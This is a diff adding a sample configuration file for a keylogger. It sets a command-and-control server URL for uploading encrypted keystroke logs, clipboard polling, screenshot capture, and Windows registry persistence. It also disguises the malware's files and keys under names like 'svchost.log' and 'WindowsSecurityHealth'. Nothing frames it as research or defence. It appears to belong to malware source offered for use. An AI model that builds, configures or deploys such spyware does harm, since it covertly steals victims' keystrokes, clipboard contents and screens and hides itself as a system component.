@@ -1,0 +1,30 @@
+# Keylogger Configuration File
+# Copy this file to config.toml and customize the values
+# WARNING: config.toml contains sensitive information and should not be committed to version control
+
+[c2]
+# C2 server URL for sending encrypted logs
+url = "https://your-c2-server.com/logs"
+# Interval in seconds between C2 communications
+interval_seconds = 30
+
+[encryption]
+# 32-byte encryption key in hex format (change this for each deployment)
+# Generate a new random key: openssl rand -hex 32
+key_hex = "4242424242424242424242424242424242424242424242424242424242424242"
+
+[logging]
+# Local log file name
+file_name = "svchost.log"
+
+[clipboard]
+# Interval in seconds between clipboard checks
+monitor_interval_seconds = 5
+
+[screenshots]
+# Directory to store screenshots
+directory = "screenshots"
+
+[persistence]
+# Windows registry key name for persistence
+registry_key = "WindowsSecurityHealth"
